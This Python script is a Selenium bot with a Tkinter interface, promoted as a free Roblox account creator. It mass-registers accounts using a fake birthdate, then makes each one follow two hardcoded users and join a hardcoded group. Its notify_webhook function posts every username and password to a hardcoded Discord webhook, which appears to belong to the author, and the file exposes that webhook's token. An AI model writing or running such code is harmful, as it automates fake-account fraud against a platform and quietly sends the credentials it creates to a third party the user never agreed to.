import time
import random
import string
import tkinter as tk
import webbrowser
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
import threading
import requests

# Define the ASCII art
ascii = f"""
░▒█▀▀▄░█▀▀▄░▄▀▀▄░▀█▀░█░▒█░█▀▀▄░█▀▀░█▀▄
░▒█░░░░█▄▄█░█▄▄█░░█░░█░▒█░█▄▄▀░█▀▀░█░█
░▒█▄▄▀░▀░░▀░█░░░░░▀░░░▀▀▀░▀░▀▀░▀▀▀░▀▀░

"""

window_size = (800, 600)
options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)
options.add_argument(f"--window-size={window_size[0]},{window_size[1]}")

# Replace with the Roblox user IDs you want to follow
TARGET_USER_IDS = ['3419127828', '6601680']

# Replace with the Roblox group ID you want to join
GROUP_ID = '34038912'

class RobloxAccountCreator:
    def __init__(self, root):
        self.root = root
        self.root.title("Roblox Account Creator")
        self.root.geometry("500x400")
        self.create_widgets()

    def create_widgets(self):
        ascii_label = tk.Label(self.root, text=ascii, justify="center", font=("Courier", 10))
        ascii_label.pack()

        credits_label = tk.Label(self.root, text="[!] CREATED AND FULLY SCRIPTED BY ! captured at Synx Reliance.\nPlease keep in mind that this is the free version.\nSo you do not get the same perks that the premium users do.\nTo purchase the paid version, please head to our Discord by clicking the Discord button.", justify="center", font=("Helvetica", 10, "bold"))
        credits_label.pack()

        self.iterations_label = tk.Label(self.root, text="Enter the number of iterations:")
        self.iterations_label.pack()
        self.iterations_entry = tk.Entry(self.root)
        self.iterations_entry.pack()

        self.name_label = tk.Label(self.root, text="Starting name:")
        self.name_label.pack()
        self.name_entry = tk.Entry(self.root)
        self.name_entry.pack()

        self.namelength_label = tk.Label(self.root, text="Name length:")
        self.namelength_label.pack()
        self.namelength_entry = tk.Entry(self.root)
        self.namelength_entry.pack()

        self.create_button = tk.Button(self.root, text="Create Accounts", command=self.start_account_creation)
        self.create_button.pack()

        self.discord_button = tk.Button(self.root, text="DISCORD", command=self.open_discord)
        self.discord_button.pack()

        self.result_label = tk.Label(self.root, text="")
        self.result_label.pack()

    def generate_random_username(self, prefix, length):
        if length <= len(prefix):
            raise ValueError("Length should be greater than the length of the prefix.")
        random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=length - len(prefix)))
        username = f"{prefix}{random_chars}"
        return username

    def generate_random_password(self, length):
        if length < 8:
            raise ValueError("Password length should be at least 8 characters.")
        characters = string.ascii_letters + string.digits
        password = ''.join(random.choice(characters) for i in range(length))
        return password

    def create_account(self, num_iterations, starting_name, name_length):
        # Manual path to chromedriver.exe
        chrome_driver_path = 'C:/chromedriver/chromedriver.exe'

        service = Service(executable_path=chrome_driver_path)
        options.add_argument("--start-maximized")

        for _ in range(num_iterations):
            driver = webdriver.Chrome(service=service, options=options)
            try:
                driver.get("https://www.roblox.com/")
                wait = WebDriverWait(driver, 10)

                self.select_birthdate(driver)
                random_username = self.generate_random_username(starting_name, name_length)
                random_password = self.generate_random_password(12)

                print(f"Creating account with username: {random_username} and password: {random_password}")

                self.fill_registration_form(driver, random_username, random_password)
                self.save_account_to_file(random_username, random_password)
                self.notify_webhook(random_username, random_password)

                # Click the sign-up button
                sign_button = driver.find_element(By.XPATH, "//*[@id='signup-button']")
                sign_button.click()
                print("Clicked sign-up button")

                # Wait for exactly 1 minute (60 seconds) for manual authorization
                time.sleep(60)

                # Check if the page has reloaded
                if driver.current_url != "https://www.roblox.com/signup":
                    print("Page reloaded, account created successfully.")
                    time.sleep(15)  # Wait an additional 15 seconds to ensure account creation

                    # Log in to the new account
                    self.login_roblox_account(driver, random_username, random_password)

                    # Follow the target accounts
                    for target_user_id in TARGET_USER_IDS:
                        self.follow_roblox_account(driver, target_user_id)

                    # Join the group
                    self.join_roblox_group(driver, GROUP_ID)

                    time.sleep(15)  # Wait an additional 15 seconds to ensure following and joining
                else:
                    print("Page did not reload within the time frame.")

                driver.quit()

            except Exception as e:
                print(f"Error creating account: {e}")
                driver.quit()
                continue

        self.result_label.config(text="Finished creating accounts")

    def start_account_creation(self):
        num_iterations = int(self.iterations_entry.get())
        starting_name = self.name_entry.get()
        name_length = int(self.namelength_entry.get())

        # Create a thread for account creation to keep the GUI responsive
        creation_thread = threading.Thread(target=self.create_account, args=(num_iterations, starting_name, name_length))
        creation_thread.start()

    def select_birthdate(self, driver):
        try:
            dropdown = driver.find_element(By.CLASS_NAME, 'rbx-select')
            dropdown.click()
            time.sleep(1)

            option_29 = driver.find_element(By.XPATH, "//option[text()='29']")
            option_29.click()
            time.sleep(1)

            dropdown = driver.find_element(By.CLASS_NAME, 'rbx-select')
            dropdown.click()

            option_january = driver.find_element(By.XPATH, "//option[@value='Jan']")
            option_january.click()
            time.sleep(1)

            dropdown = driver.find_element(By.CLASS_NAME, 'rbx-select')
            dropdown.click()

            option_1999 = driver.find_element(By.XPATH, "//option[@value='1999']")
            option_1999.click()
            time.sleep(1)
        except Exception as e:
            print(f"Error selecting birthdate: {e}")

    def fill_registration_form(self, driver, username, password):
        try:
            # Explicit wait for the username field to be present
            username_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//*[@id='signup-username']"))
            )
            username_field.send_keys(username)
            print(f"Entered username: {username}")

            # Explicit wait for the password field to be present
            password_field = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//*[@id='signup-password']"))
            )
            password_field.send_keys(password)
            print(f"Entered password: {password}")

            selected_function = random.choice([self.Gender1, self.Gender2])
            selected_function(driver)
            time.sleep(1)

        except Exception as e:
            print(f"Error filling registration form: {e}")

    def save_account_to_file(self, username, password):
        with open("accounts.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        print(f"Saved account details to file: Username: {username}, Password: {password}")

    def notify_webhook(self, username, password):
        hook_url = 'https://discord.com/api/webhooks/1387937396397441094/HSmrZrvJJtbJ1iEbxLe0R8e_kAh6_j_9Yd4v1JLKlye93oylDn8dC8xapmOmWSjXGTvb'
        message = f"New Roblox account created:\nUsername: {username}\nPassword: {password}"
        payload = {'content': message}
        requests.post(hook_url, json=payload)
        print(f"Sent account details to webhook: Username: {username}, Password: {password}")

    def Gender1(self, driver):
        try:
            gender_button = driver.find_element(By.XPATH, "//*[@id='MaleButton']")
            gender_button.click()
        except Exception as e:
            print(f"Error selecting male gender: {e}")

    def Gender2(self, driver):
        try:
            gender_button = driver.find_element(By.XPATH, "//*[@id='FemaleButton']")
            gender_button.click()
        except Exception as e:
            print(f"Error selecting female gender: {e}")

    def open_discord(self):
        url = "https://discord.gg/Pkqcc2Wf72"
        webbrowser.open(url)

    def login_roblox_account(self, driver, username, password):
        driver.get('https://www.roblox.com/login')
        time.sleep(2)

        username_field = driver.find_element(By.ID, 'login-username')
        username_field.send_keys(username)

        password_field = driver.find_element(By.ID, 'login-password')
        password_field.send_keys(password)

        login_button = driver.find_element(By.XPATH, '//button[@type="submit"]')
        login_button.click()
        time.sleep(5)

    def follow_roblox_account(self, driver, target_user_id):
        driver.get(f'https://www.roblox.com/users/{target_user_id}/profile')
        time.sleep(2)

        try:
            follow_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(text(), "Follow")]'))
            )
            follow_button.click()
            print(f"Followed user ID: {target_user_id}")
            time.sleep(2)
        except Exception as e:
            print(f"Error following user ID {target_user_id}: {e}")

    def join_roblox_group(self, driver, group_id):
        driver.get(f'https://www.roblox.com/groups/group.aspx?gid={group_id}')
        time.sleep(2)

        try:
            join_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, '//button[contains(text(), "Join Group")]'))
            )
            join_button.click()
            print(f"Joined group ID: {group_id}")
            time.sleep(2)
        except Exception as e:
            print(f"Error joining group ID {group_id}: {e}")

# Create the GUI
root = tk.Tk()
app = RobloxAccountCreator(root)
root.mainloop()
